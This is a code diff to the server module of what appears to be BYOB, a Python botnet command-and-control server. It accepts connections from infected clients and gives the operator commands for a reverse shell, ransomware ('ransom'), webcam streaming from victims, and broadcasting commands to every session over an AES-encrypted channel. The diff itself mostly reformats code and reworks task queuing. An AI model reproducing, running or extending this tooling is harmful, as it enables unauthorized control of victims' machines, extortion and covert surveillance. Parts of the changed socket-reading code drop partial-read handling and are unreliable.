@@ -21,6 +21,7 @@ import os
 import sys
 import time
 import json
+import Queue
 import pickle
 import socket
 import struct
@@ -48,9 +49,9 @@ except:
 from core import *
 
 # globals
-packages  = ['cv2','colorama']
+packages = ['cv2','colorama']
 platforms = ['win32','linux2','darwin']
-missing   = []
+missing = []
 
 # setup
 util.is_compatible(platforms, __name__)
@@ -69,9 +70,9 @@ if missing:
 
 # globals
 __threads = {}
-__abort   = False
-__debug   = bool('--debug' in sys.argv)
-__logger  = logging.getLogger('SERVER')
+__abort = False
+__debug = bool('--debug' in sys.argv)
+__logger = logging.getLogger('SERVER')
 logging.basicConfig(level=logging.DEBUG if globals()['__debug'] else logging.INFO, handler=logging.StreamHandler())
 
 def main():
@@ -115,11 +116,11 @@ class C2():
     incoming completed tasks from clients
     
     """
-    _lock           = threading.Lock()
-    _text_color     = 'RED'
-    _text_style     = 'DIM'
-    _prompt_color   = 'RESET'
-    _prompt_style   = 'BRIGHT'
+    _lock = threading.Lock()
+    _text_color = 'RED'
+    _text_style = 'DIM'
+    _prompt_color = 'RESET'
+    _prompt_style = 'BRIGHT'
 
     def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
         """ 
@@ -133,42 +134,41 @@ class C2():
         Returns a byob.server.C2 instance
         
         """
-        self._active            = threading.Event()
-        self._count             = 1
-        self._prompt            = None
-        self.current_session    = None
-        self.sessions           = {}
-        self.socket             = self._socket()
-        self.banner             = self._banner()
-        self.database           = database.Database(db)
-        self.commands           = {
-            'set'           :   self.set,
-            'help'          :   self.help,
-            'exit'          :   self.quit,
-            'quit'          :   self.quit,
-            '$'             :   self.eval,
-            'eval'          :   self.eval,
-            'debug'         :   self.eval,
-            'db'            :   self.query,
-            'query'         :   self.query,
-            'database'      :   self.query,
-            'options'       :   self.settings,
-            'settings'      :   self.settings,
-            'sessions'      :   self.session_list,
-            'clients'       :   self.session_list,
-            'shell'         :   self.session_shell,
-            'ransom'        :   self.session_ransom,
-            'webcam'        :   self.session_webcam,
-            'kill'          :   self.session_remove,
-            'drop'          :   self.session_remove,
-            'back'          :   self.session_background,
-            'bg'            :   self.session_background,
-            'background'    :   self.session_background,
-            'sendall'       :   self.task_broadcast,
-            'broadcast'     :   self.task_broadcast,
-            'results'       :   self.task_list,
-            'tasks'         :   self.task_list
-            }
+        self._active = threading.Event()
+        self._count = 1
+        self._prompt = None
+        self._database = db
+        self.current_session = None
+        self.sessions = {}
+        self.socket = self._socket()
+        self.banner = self._banner()
+        self.commands = {
+            'set' : self.set,
+            'help' : self.help,
+            'exit' : self.quit,
+            'quit' : self.quit,
+            '$' : self.eval,
+            'eval' : self.eval,
+            'debug' : self.eval,
+            'db' : self.query,
+            'query' : self.query,
+            'database' : self.query,
+            'options' : self.settings,
+            'settings' : self.settings,
+            'sessions' : self.session_list,
+            'clients' : self.session_list,
+            'shell' : self.session_shell,
+            'ransom' : self.session_ransom,
+            'webcam' : self.session_webcam,
+            'kill' : self.session_remove,
+            'drop' : self.session_remove,
+            'back' : self.session_background,
+            'bg' : self.session_background,
+            'background' : self.session_background,
+            'sendall' : self.task_broadcast,
+            'broadcast' : self.task_broadcast,
+            'results' : self.task_list,
+            'tasks' : self.task_list}
 
     def _error(self, data):
         lock = self.current_session.lock if self.current_session else self._lock
@@ -186,7 +186,7 @@ class C2():
             max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
             max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
             key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
-            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
+            keys  = {k: key_len[k] for k in sorted(key_len.keys())}
             with lock:
                 for key in keys.values():
                     if info.get(key) and info.get(key) != 'None':
@@ -301,7 +301,7 @@ class C2():
         """
         column1 = 'command <arg>'
         column2 = 'description'
-        info    = info if info else {"back": "background the current session", "shell <id>": "interact with client via reverse shell", "sessions": "list all sessions", "exit": "exit the program but keep sessions alive", "sendall <command>": "send a command to all active sessions", "settings <value> [options]": "show current settings", "set <option>=[value]": "change settings/options"}
+        info = info if info else {"back": "background the current session", "shell <id>": "interact with client via reverse shell", "sessions": "list all sessions", "exit": "exit the program but keep sessions alive", "sendall <command>": "send a command to all active sessions", "settings <value> [options]": "show current settings", "set <option>=[value]": "change settings/options"}
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
         util.display('\n', end=',')
@@ -351,8 +351,8 @@ class C2():
         Show the server's currently configured settings
         
         """
-        text_color   = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
-        text_style   = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
+        text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
+        text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
         prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
         prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
         util.display('\n\t    SETTINGS', color='reset', style='bright')
@@ -380,11 +380,11 @@ class C2():
 
         """
         if args:
-            arguments    = self._get_arguments(args)
+            arguments = self._get_arguments(args)
             args, kwargs = arguments.args, arguments.kwargs
             if arguments.args:
                 target = args[0]
-                args   = args[1:]
+                args = args[1:]
                 if target in ('debug','debugging'):
                     if args:
                         setting = args[0]
@@ -418,6 +418,20 @@ class C2():
                         util.display(option + '\n', color=self._text_color, style=self._text_style)
                         return
         util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
+
+    def task_handler(self):
+        """ 
+        Loop through active sessions, passing the tasks completed by 
+        each client to the database for tracking and/or storage
+
+        """
+        for session_id, session in self.sessions.items():
+            while True:
+                try:
+                    task = session.tasks.get_nowait()
+                    self.database.handle_task(task)
+                except Exception as e:
+                    break
 
     def task_list(self, id=None):
         """ 
@@ -469,7 +483,7 @@ class C2():
                     s.listen(1)
                     cmd = 'webcam stream {}'.format(port)
                     self.send(cmd, session.id)
-                    conn, addr  = s.accept()
+                    conn, addr = s.accept()
                     break
                 except:
                     retries -= 1
@@ -499,8 +513,8 @@ class C2():
                 result = 'Webcam stream ended'
         else:
             self.send("webcam %s" % args, session.id)
-            task    = self.recv(id=session.id)
-            result  = task.get('result')
+            task = self.recv(id=session.id)
+            result = task.get('result')
         self.display(result)
 
     def session_remove(self, session):
@@ -591,7 +605,7 @@ class C2():
                 self.current_session._active.clear()
             self.current_session = self.sessions[int(session)]
             util.display("\n\t[+] ", color='cyan', style='bright', end=',')
-            util.display("Client {} selected\n".format(session.id), color='reset', style='dim')
+            util.display("Client {} selected\n".format(self.current_session.id), color='reset', style='dim')
             self.current_session._active.set()
             return self.current_session.run()
 
@@ -613,14 +627,27 @@ class C2():
 
     @util.threaded
     def serve_until_stopped(self):
+        self.database = database.Database(self._database)
         while True:
             connection, address = self.socket.accept()
-            util.display("\n\n\t[+]", color='green', style='bright', end=',')
-            util.display("New Connection ({}:{})\n".format(address[0], address[1]), color='reset', style='bright')
-            client = Session(connection=connection, id=self._count)
-            self.sessions[self._count] = client
+            session = Session(connection=connection, id=self._count)
+            info = self.database.handle_session(session.info)
+            if isinstance(info, dict):
+                session.info = info
+            self.sessions[self._count] = session
             self.sessions[self._count].start()
             self._count += 1
+            util.display("\n\n\t[+]", color='green', style='bright', end=',')
+            util.display("New Connection:", color='reset', style='bright', end=',')
+            util.display(address[0], color='reset', style='dim')
+            util.display("\t    Session:", color='reset', style='bright', end=',')
+            util.display(str(self._count), color='reset', style='dim')
+            util.display("\t    Started:", color='reset', style='bright', end=',')
+            util.display(time.ctime(session._created), color='reset', style='dim')
+            util.display("\t    Key:", color='reset', style='bright', end=',')
+            util.display(base64.b64encode(session.key), color='reset', style='dim')
+            util.display("\t    Info:", color='reset', style='bright')
+            self.display(session.info)
             prompt = self.current_session._prompt if self.current_session else self._prompt
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             abort = globals()['__abort']
@@ -639,15 +666,15 @@ class C2():
             try:
                 self._active.wait()
                 self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
-                cmd_buffer   = self._get_prompt(self._prompt)
+                cmd_buffer = self._get_prompt(self._prompt)
                 if cmd_buffer:
                     output = ''
-                    cmd, _, action  = cmd_buffer.partition(' ')
+                    cmd, _, action = cmd_buffer.partition(' ')
                     if cmd in self.commands:
                         try:
-                            output  = self.commands[cmd](action) if len(action) else self.commands[cmd]()
+                            output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                         except Exception as e1:
-                            output  = str(e1)
+                            output = str(e1)
                     elif cmd == 'cd':
                         try:
                             os.chdir(action)
@@ -679,7 +706,6 @@ class Session(threading.Thread):
         Create a new Session 
 
         `Requires`
-        :param server:      byob.server.C2 instance
         :param connection:  socket.socket object
 
         `Optional`
@@ -687,16 +713,20 @@ class Session(threading.Thread):
 
         """
         super(Session, self).__init__()
-        print("\n\tSession started: {}".format(time.ctime()))
-        self._prompt    = None
-        self._active    = threading.Event()
-        self._created   = time.time()
+        self._prompt = None
+        self._active = threading.Event()
+        self._created = time.time()
         self.connection = connection
-        self.id         = id
-        self.key        = security.diffiehellman(self.connection)
-        self.info       = self.client_info()
+        self.tasks = Queue.Queue()
+        self.id = id
+        self.key = security.diffiehellman(self.connection)
+        self.info = self.client_info()
 
-    def _kill(self):
+    def kill(self):
+        """ 
+        Kill the reverse TCP shell session
+
+        """
         self._active.clear()
         globals()['c2'].session_remove(self.id)
         globals()['c2'].current_session = None
@@ -710,17 +740,11 @@ class Session(threading.Thread):
         
         """
         header_size = struct.calcsize("L")
-        header      = self.connection.recv(header_size)
-        msg_size    = struct.unpack(">L", header)[0]
-        msg         = self.connection.recv(msg_size)
-        while len(msg) < msg_size:
-             msg += self.connection.recv(msg_size - len(msg))
-        info = security.decrypt_aes(msg, self.key)
-        info = json.loads(data)
-        info2 = globals()['c2'].database.handle_session(info)
-        if isinstance(info2, dict):
-            info = info2
-        globals()['c2'].send_task(json.dumps(info))
+        header = self.connection.recv(header_size)
+        msg_size = struct.unpack(">L", header)[0]
+        msg = self.connection.recv(msg_size)
+        text = security.decrypt_aes(msg, self.key)
+        info = json.loads(text)
         return info
 
     def status(self):
@@ -728,7 +752,7 @@ class Session(threading.Thread):
         Check the status and duration of the session
         
         """
-        c    = time.time() - float(self._created)
+        c = time.time() - float(self._created)
         data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                 '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                 '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
@@ -774,14 +798,9 @@ class Session(threading.Thread):
 
         """
         hdr_len = struct.calcsize('!L')
-        hdr     = self.connection.recv(hdr_len)
+        hdr = self.connection.recv(hdr_len)
         msg_len = struct.unpack('!L', hdr)[0]
-        msg     = self.connection.recv(msg_len)
-        while len(msg) < msg_len:
-            try:
-                msg += self.connection.recv(msg_len - len(msg))
-            except (socket.timeout, socket.error):
-                break
+        msg = self.connection.recv(msg_len)
         data = security.decrypt_aes(msg, self.key)
         return json.loads(data)
 
@@ -809,7 +828,7 @@ class Session(threading.Thread):
                             if result:
                                 task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                 globals()['c2'].display(result)
-                                globals()['c2'].database.handle_task(task)
+                                self.tasks.put_nowait(task)
                             continue
                         else:
                             task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
@@ -817,13 +836,13 @@ class Session(threading.Thread):
                     elif 'result' in task:
                         if task.get('result') and task.get('result') != 'None':
                             globals()['c2'].display(task.get('result'))
-                            globals()['c2'].database.handle_task(task)
+                            self.tasks.put_nowait(task)
                     else:
                         if self._abort:
                             break
                     self._prompt = None
             except Exception as e:
-                self._error(str(e))
+                globals()['c2']._error(str(e))
                 time.sleep(1)
                 break
         self._active.clear()
